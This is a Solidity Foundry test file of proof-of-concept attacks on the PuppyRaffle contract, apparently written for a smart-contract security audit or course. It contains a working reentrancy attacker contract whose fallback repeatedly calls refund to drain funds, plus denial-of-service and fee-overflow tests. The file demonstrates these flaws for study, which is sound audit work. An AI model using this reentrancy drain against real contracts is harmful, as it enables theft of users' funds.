// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {PuppyRaffleTest, PuppyRaffle, console} from "../../test/PuppyRaffleTest.t.sol";

contract AttackerReentrancy {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee ;
    uint256 attackerIndex;

    constructor(PuppyRaffle puppyRuffle_){
        puppyRaffle = puppyRuffle_;
        entranceFee = puppyRaffle.entranceFee();
    } 

    function attack() external payable {
        address[] memory addressContract = new address[](1);
        addressContract[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(addressContract);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if(address(puppyRaffle).balance > 0){
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable{
        _stealMoney();
    }

    receive() external payable{
        _stealMoney();
    }
}

contract ProofOfCodes is PuppyRaffleTest {
    function test_denialOfServices() public {
        uint256 playersNum = 100;
        address[] memory playersAddress = new address[](playersNum);
        for(uint256 i; i<playersNum; i++){
            playersAddress[i] = address(i);
        }
        
        vm.txGasPrice(1);
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersAddress.length}(playersAddress);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = ((gasStart - gasEnd) * tx.gasprice);

        uint256 playersNumTwo = 100;
        address[] memory playersAddressTwo = new address[](playersNumTwo);
        for(uint256 i; i<playersNumTwo; i++){
            playersAddressTwo[i] = address(i + playersNumTwo);
        }
        
        vm.txGasPrice(1);
        uint256 gasStartTwo = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersAddressTwo.length}(playersAddressTwo);
        uint256 gasEndTwo = gasleft();
        uint256 gasUsedSecond = ((gasStartTwo - gasEndTwo) * tx.gasprice);
        
        console.log("gas used first 100 players ", gasUsedFirst);
        console.log("gas used second 100 players ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }

    function test_reentrancyRefund() public playersEntered {
        AttackerReentrancy attackerContract = new AttackerReentrancy(puppyRaffle);
        
        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

        console.log("starting attack contract balance : ", startingAttackContractBalance);
        console.log("starting puppy raffle balance : ", startingPuppyRaffleBalance);

        attackerContract.attack{value: entranceFee}();
        
        uint256 endingAttackContractBalance = address(attackerContract).balance;
        uint256 endingPuppyRaffleBalance = address(puppyRaffle).balance;

        console.log("ending attack contract balance : ", endingAttackContractBalance);
        console.log("ending puppy raffle balance : ", endingPuppyRaffleBalance);
    }

    function test_arithmeticOverflow() public {
        // first scenario
        uint length = 50;
        address[] memory players1 = new address[](length);
        for (uint i = 0; i < length; i++) {
            players1[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * length}(players1);

        vm.warp(block.timestamp + duration + 1);
        puppyRaffle.selectWinner();

        uint256 expectedTotalFees1 = entranceFee * length * 20 / 100;
        uint64 actualTotalFees1 = puppyRaffle.totalFees();

        assertEq(expectedTotalFees1, actualTotalFees1);

        // second scenario
        address[] memory players2 = new address[](length);
        for (uint i = 0; i < length; i++) {
            players2[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * length}(players2);

        vm.warp(block.timestamp + duration + 1);
        puppyRaffle.selectWinner();   

        uint256 expectedTotalFees2 = expectedTotalFees1 + (entranceFee * length * 20 / 100);
        uint64 actualTotalFees2 = puppyRaffle.totalFees();

        assertNotEq(expectedTotalFees2, actualTotalFees2);
        //      20000000000000000000, 1553255926290448384

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}